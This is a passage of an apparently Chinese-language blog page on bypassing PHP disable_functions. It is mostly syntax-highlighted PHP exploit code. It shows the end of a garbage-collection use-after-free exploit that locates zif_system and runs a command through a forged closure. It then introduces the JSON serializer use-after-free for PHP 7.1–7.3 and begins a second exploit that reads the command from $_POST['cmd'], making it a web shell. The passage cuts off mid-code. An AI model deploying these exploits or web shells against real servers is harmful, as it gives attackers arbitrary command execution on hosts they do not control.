class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$chtg</span>;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;chtg = <span class="hljs-variable language_">$this</span>-&gt;ryat;<br>            <span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);<br><br>    <span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><br>    <span class="hljs-variable">$v</span> = [];<br>    <span class="hljs-variable">$v</span>[<span class="hljs-number">0</span>] = <span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$v</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$out</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JSON-Serializer-UAF（PHP-7-1-7-3）"><a href="#JSON-Serializer-UAF（PHP-7-1-7-3）" class="headerlink" title="JSON_Serializer_UAF（PHP 7.1-7.3）"></a>JSON_Serializer_UAF（PHP 7.1-7.3）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><p><strong>原理</strong></p><p>此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令</p><p><a href="https://bugs.php.net/bug.php?id=77843">Use after free with json serializer</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd = &quot;id&quot;;</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br><span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MySplFixedArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFixedArray</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Z</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>      <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># unable to leak ro segments</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak1</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">8</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$spl1</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># the real deal</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>;<br><br>        <span class="hljs-comment"># fake reference zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0xdeadbeef</span>); <span class="hljs-comment"># gc_refcounted</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x18</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x20</span>, <span class="hljs-number">6</span>); <span class="hljs-comment"># type (string)</span><br><br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$spl1</span>::<span class="hljs-variable">$leak</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-variable 